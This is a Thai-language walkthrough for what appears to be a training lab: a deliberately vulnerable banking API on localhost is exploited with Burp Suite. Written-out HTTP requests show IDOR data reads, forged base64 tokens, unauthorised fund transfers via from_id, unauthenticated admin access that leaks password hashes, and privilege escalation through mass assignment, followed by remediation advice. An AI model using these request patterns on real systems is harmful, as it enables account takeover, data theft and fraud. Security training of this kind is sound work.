# Lab 1 Walkthrough — ธนาคารกรุงเทพดิจิทัล

**เป้าหมาย:** ค้นหาและใช้ประโยชน์จากช่องโหว่ 4 ประเภทใน banking API  
**เครื่องมือ:** Burp Suite (Intercept + Repeater)

---

## ขั้นตอนเตรียมการ

1. เปิด Burp Suite → ตั้ง proxy `127.0.0.1:8080`
2. ตั้ง browser ให้ใช้ proxy เดียวกัน
3. เปิด `http://localhost:23101` (หรือ port ของตัวเอง)

---

## Step 0 — Login และดู Token

1. Login ด้วย `alice` / `alice1234`
2. ใน Burp HTTP History ดู request `POST /api/login`
3. ดู response: `{"token": "YWxpY2U=", ...}`
4. decode base64: `YWxpY2U=` → `alice`

**สังเกต:** token คือแค่ชื่อ user ที่ encode base64 ไม่มี signature ใดๆ

---

## Challenge 1 — BOLA (Broken Object Level Authorization)

**ช่องโหว่:** API ไม่ตรวจว่าผู้เรียกเป็นเจ้าของข้อมูลที่ขอ

### 1a. ดูข้อมูลคนอื่น (IDOR)

ใน Burp HTTP History หาดู request `GET /api/users/1`  
ส่ง request นี้ไป **Repeater** → เปลี่ยน `1` → `2`

```
GET /api/users/2 HTTP/1.1
Host: localhost:23101
Authorization: Bearer YWxpY2U=
```

**ผลลัพธ์:** ได้ข้อมูลของ Bob รวมถึง `is_admin` และ `internal_score`  
ลอง id=3, id=99 เพื่อดูข้อมูลทุกคนรวม admin

### 1b. ดูธุรกรรมของคนอื่น

```
GET /api/users/2/transactions HTTP/1.1
Authorization: Bearer YWxpY2U=
```

ได้ประวัติของ Bob ทั้งหมด

---

## Challenge 2 — Excessive Data Exposure

**ช่องโหว่:** API ส่ง field ที่ไม่ควรเห็นมาใน response

### ดู response ของ `/api/users/1`

```json
{
  "id": 1,
  "ชื่อ": "alice",
  "อีเมล": "alice@krungthepbank.th",
  "ยอดเงิน": 50000,
  "is_admin": false,
  "internal_score": 720
}
```

**สังเกต:** Dashboard ไม่แสดง `internal_score` และ `is_admin`  
แต่ API ส่งมาทุกครั้ง — ใครก็ตามที่เห็น traffic จะรู้ข้อมูลเหล่านี้

### ค้นหาด้วย `/api/search?name=`

```
GET /api/search?name= HTTP/1.1
Authorization: Bearer YWxpY2U=
```

ส่ง name ว่าง → ได้ผู้ใช้ **ทั้งหมด** ในระบบ

---

## Challenge 3 — BOLA Write (โอนเงินจากบัญชีคนอื่น)

**ช่องโหว่:** `/api/transfer` ไม่ตรวจว่า `from_id` ตรงกับ token ที่ส่งมา

### ขั้นตอน

1. ใน Burp Interceptor เปิด Intercept ON
2. กดปุ่ม "โอนเงิน" ใน browser → กรอก to_id=1, amount=100
3. จับ request `POST /api/transfer` → ส่งไป Repeater
4. แก้ body:

```json
{"from_id": 2, "to_id": 1, "amount": 99999}
```

**ผลลัพธ์:** โอนเงินจากบัญชี Bob ไปหา Alice ได้สำเร็จ  
ตรวจสอบด้วย `GET /api/users/2` → ยอดเงินลดลง

---

## Challenge 4 — BFLA (Broken Function Level Authorization)

**ช่องโหว่:** endpoint admin ไม่ตรวจว่าผู้เรียกเป็น admin

### ค้นหา endpoint จาก app.js

เปิด `http://localhost:23101/static/app.js`  
เห็น comment: `// TODO: ลบออกก่อน deploy — admin only`  
และฟังก์ชัน `adminGetAllUsers()` ที่เรียก `/api/admin/users`

### เรียก endpoint โดยตรง

```
GET /api/admin/users HTTP/1.1
Authorization: Bearer YWxpY2U=
```

**ผลลัพธ์:** ได้รายชื่อผู้ใช้ทั้งหมด **รวม password_hash** ของทุกคน

---

## Challenge 5 — Mass Assignment (เพิ่มสิทธิ์ตัวเอง)

**ช่องโหว่:** `/api/users/update` รับทุก field โดยไม่ filter

### ขั้นตอน

1. ไปหน้า "แก้ไขโปรไฟล์" → สังเกตว่า form มีแค่ ชื่อ กับ อีเมล
2. เปิด Intercept ON → กดบันทึก
3. จับ `POST /api/users/update` → ส่งไป Repeater
4. แก้ body เพิ่ม field พิเศษ:

```json
{"ชื่อ": "alice", "อีเมล": "alice@krungthepbank.th", "is_admin": true}
```

**ผลลัพธ์:** Alice กลายเป็น admin  
ยืนยันด้วย `GET /api/users/1` → `"is_admin": true`

---

## สรุปช่องโหว่ที่พบ

| # | ช่องโหว่ | Endpoint | ผลกระทบ |
|---|----------|----------|----------|
| 1 | BOLA (read) | `GET /api/users/<id>` | ดูข้อมูลทุกคน |
| 2 | BOLA (read) | `GET /api/users/<id>/transactions` | ดูธุรกรรมทุกคน |
| 3 | Excessive Data Exposure | `GET /api/users/<id>` | เห็น internal_score, is_admin |
| 4 | BOLA (write) | `POST /api/transfer` | โอนเงินจากบัญชีคนอื่น |
| 5 | BFLA | `GET /api/admin/users` | ได้ password ทุกคน |
| 6 | Mass Assignment | `POST /api/users/update` | เพิ่มสิทธิ์ตัวเองเป็น admin |
| 7 | Weak Auth | `POST /api/login` | Token = base64(username) |
| 8 | Info Disclosure | `/api/search?name=` | list user ทั้งหมด |

---

## การแก้ไข (สำหรับ dev ที่ดี)

1. **BOLA:** ตรวจสอบว่า `token_user.id == requested_id` ก่อน return ข้อมูล
2. **Excessive Data Exposure:** กรอง field ก่อน serialize — ส่งเฉพาะที่ client ต้องการ
3. **BFLA:** ตรวจ `is_admin` จาก token ก่อนเข้า admin endpoint
4. **Mass Assignment:** whitelist field ที่อนุญาตให้ update เท่านั้น
5. **Weak Token:** ใช้ JWT พร้อม secret key หรือ session cookie ที่ signed
